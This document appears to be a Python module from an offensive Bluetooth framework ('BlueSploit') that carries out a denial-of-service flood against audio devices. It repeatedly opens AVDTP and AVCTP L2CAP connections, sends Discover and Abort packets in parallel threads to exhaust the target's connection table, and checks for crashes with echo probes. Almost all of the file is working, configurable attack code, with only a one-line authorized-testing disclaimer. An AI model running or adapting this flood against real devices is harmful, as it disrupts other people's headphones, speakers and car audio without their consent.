"""
BlueSploit DoS: A2DP / AVDTP Connection Flood

Floods a Bluetooth audio device (speaker, headphones, car stereo) by
repeatedly opening and abandoning AVDTP signaling connections on PSM
0x0019 (AVDTP) and optionally 0x0017 (AVCTP). Each incomplete open
occupies a kernel channel slot and forces the target's A2DP stack to
process stream setup / teardown, exhausting connection table entries
and audio thread resources.

Effect:
  - Audio dropouts or complete audio freeze on headphones/speakers
  - Bluetooth stack restart on embedded targets (IoT speakers)
  - AVDTP stream teardown while media is playing

CWE: CWE-400 (Uncontrolled Resource Consumption)
"""

import struct
import time
import os
import threading
from typing import Dict
from core.base import DosModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False

# L2CAP signaling
L2CAP_CONN_REQ    = 0x02
L2CAP_CONF_REQ    = 0x04
L2CAP_DISCONN_REQ = 0x06
L2CAP_ECHO_REQ    = 0x08

# AVDTP signaling opcodes (sent over L2CAP PSM 0x0019)
AVDTP_DISCOVER          = 0x01
AVDTP_GET_CAPABILITIES  = 0x02
AVDTP_SET_CONFIGURATION = 0x03
AVDTP_OPEN              = 0x06
AVDTP_START             = 0x07
AVDTP_CLOSE             = 0x08
AVDTP_ABORT             = 0x0A

# AVDTP message type
AVDTP_MSG_TYPE_CMD      = 0x00

PSM_AVDTP = 0x0019
PSM_AVCTP = 0x0017


def _avdtp_pkt(txlabel: int, msg_type: int, signal_id: int, payload: bytes = b"") -> bytes:
    header = ((txlabel & 0x0F) << 4) | (msg_type & 0x03)
    return bytes([header, signal_id]) + payload


def _l2cap_conn_req(psm: int, scid: int, ident: int) -> bytes:
    payload = struct.pack("<HH", psm, scid)
    return struct.pack("<BBH", L2CAP_CONN_REQ, ident, len(payload)) + payload


def _l2cap_disconn_req(dcid: int, scid: int, ident: int) -> bytes:
    payload = struct.pack("<HH", dcid, scid)
    return struct.pack("<BBH", L2CAP_DISCONN_REQ, ident, len(payload)) + payload


class Module(DosModule):
    """
    A2DP / AVDTP Connection Flood

    Opens many AVDTP signaling connections simultaneously, sends
    partial stream-setup sequences, and tears them down abruptly
    to exhaust the target's AVDTP connection table and audio resources.
    """

    info = ModuleInfo(
        name="A2DP / AVDTP Connection Flood",
        description=(
            "Flood Bluetooth audio devices by opening and abandoning "
            "AVDTP signaling connections, disrupting audio streaming"
        ),
        author=["BlueSploit"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        cve=None,
        references=[
            "https://www.bluetooth.com/specifications/specs/a2dp-1-3-2/",
            "https://www.bluetooth.com/specifications/specs/avdtp-1-3/",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target BD_ADDR of audio device (XX:XX:XX:XX:XX:XX)",
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="threads",
            required=False,
            description="Concurrent flood threads",
            default=8,
        ))
        self.add_option(ModuleOption(
            name="iterations",
            required=False,
            description="Open/abort cycles per thread",
            default=150,
        ))
        self.add_option(ModuleOption(
            name="flood_avctp",
            required=False,
            description="Also flood AVCTP PSM 0x0017 (true/false)",
            default="true",
        ))
        self.add_option(ModuleOption(
            name="send_discover",
            required=False,
            description="Send AVDTP Discover before aborting (true/false)",
            default="true",
        ))
        self.add_option(ModuleOption(
            name="timeout",
            required=False,
            description="Per-connection timeout in seconds",
            default=5,
        ))

    def check(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required, pip install pybluez2")
            return False
        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        timeout = int(self.get_option("timeout"))

        print_info(f"Probing {target}, AVDTP PSM 0x{PSM_AVDTP:04X}...")
        try:
            s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            s.settimeout(float(timeout))
            s.connect((target, PSM_AVDTP))
            s.close()
            print_success("AVDTP PSM reachable, target is likely an audio device")
            return True
        except bluetooth.BluetoothError as e:
            print_warning(f"AVDTP PSM unreachable: {e}")
            return False

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required, pip install pybluez2")
            return False
        if os.geteuid() != 0:
            print_error("Root privileges required")
            return False

        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        n_threads = int(self.get_option("threads"))
        iterations = int(self.get_option("iterations"))
        flood_avctp = str(self.get_option("flood_avctp")).lower() == "true"
        send_discover = str(self.get_option("send_discover")).lower() == "true"
        timeout = int(self.get_option("timeout"))

        psms = [PSM_AVDTP]
        if flood_avctp:
            psms.append(PSM_AVCTP)

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}A2DP / AVDTP Connection Flood{C.RESET}                            {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"Target     : {target}")
        print_info(f"PSMs       : {[hex(p) for p in psms]}")
        print_info(f"Threads    : {n_threads}")
        print_info(f"Iterations : {iterations} cycles/thread")
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_warning("This will disrupt Bluetooth audio on the target device.")

        stats: Dict[str, int] = {"completed": 0, "errors": 0, "crash_signals": 0}
        lock = threading.Lock()
        stop = threading.Event()
        barrier = threading.Barrier(n_threads, timeout=10.0)

        def worker(tid: int) -> None:
            try:
                barrier.wait()
            except threading.BrokenBarrierError:
                return

            psm = psms[tid % len(psms)]
            for _ in range(iterations):
                if stop.is_set():
                    break
                crashed = self._flood_cycle(target, psm, send_discover, timeout)
                with lock:
                    if crashed:
                        stats["crash_signals"] += 1
                        stop.set()
                    else:
                        stats["completed"] += 1

        threads = [
            threading.Thread(target=worker, args=(i,), daemon=True)
            for i in range(n_threads)
        ]
        for t in threads:
            t.start()

        print_info(f"\nFlooding AVDTP on {target}...")
        prev = 0
        while any(t.is_alive() for t in threads):
            time.sleep(1.5)
            done = stats["completed"]
            if done != prev:
                print_info(
                    f"  Cycles: {done}/{iterations * n_threads} | "
                    f"Errors: {stats['errors']} | "
                    f"Crash signals: {stats['crash_signals']}"
                )
                prev = done

        for t in threads:
            t.join(timeout=5.0)

        print_info("─" * 55)
        total = stats["completed"] + stats["crash_signals"]
        if total > 0:
            print_success(f"A2DP flood: {total} AVDTP open/abort cycles sent to {target}")
            if stats["crash_signals"] > 0:
                print_success(f"Crash signals: {stats['crash_signals']}, audio stack likely disrupted")
            else:
                print_info("Flood complete, check if audio was interrupted on target")
            self.add_result({
                "target": target,
                "psms": psms,
                "total_cycles": total,
                "crash_signals": stats["crash_signals"],
            })
            return True

        print_error("No cycles completed, target unreachable")
        return False

    def _flood_cycle(self, target: str, psm: int, send_discover: bool, timeout: int) -> bool:
        """
        Single open/abort cycle on AVDTP or AVCTP.
        Opens L2CAP connection, optionally sends AVDTP Discover, then aborts.
        Returns True if crash detected.
        """
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(float(timeout))
            sock.connect((target, psm))

            if send_discover and psm == PSM_AVDTP:
                # AVDTP Discover, forces SEP enumeration on target
                pkt = _avdtp_pkt(txlabel=1, msg_type=AVDTP_MSG_TYPE_CMD,
                                  signal_id=AVDTP_DISCOVER)
                try:
                    sock.send(pkt)
                    sock.settimeout(0.5)
                    sock.recv(64)
                except Exception:
                    pass

                # Send AVDTP Abort immediately, forces teardown mid-setup
                abort = _avdtp_pkt(txlabel=2, msg_type=AVDTP_MSG_TYPE_CMD,
                                   signal_id=AVDTP_ABORT,
                                   payload=bytes([0x01 << 2]))
                try:
                    sock.send(abort)
                except Exception:
                    pass

            # Echo probe, no response = disruption detected
            echo = struct.pack("<BBH", L2CAP_ECHO_REQ, 0x42, 4) + b"A2DP"
            sock.send(echo)
            sock.settimeout(0.6)
            try:
                sock.recv(32)
            except Exception:
                sock.close()
                return True

            sock.close()
            return False

        except bluetooth.BluetoothError as e:
            err = str(e).lower()
            if any(k in err for k in ("refused", "reset", "not connected", "broken pipe")):
                return True
            return False
        except OSError:
            return True
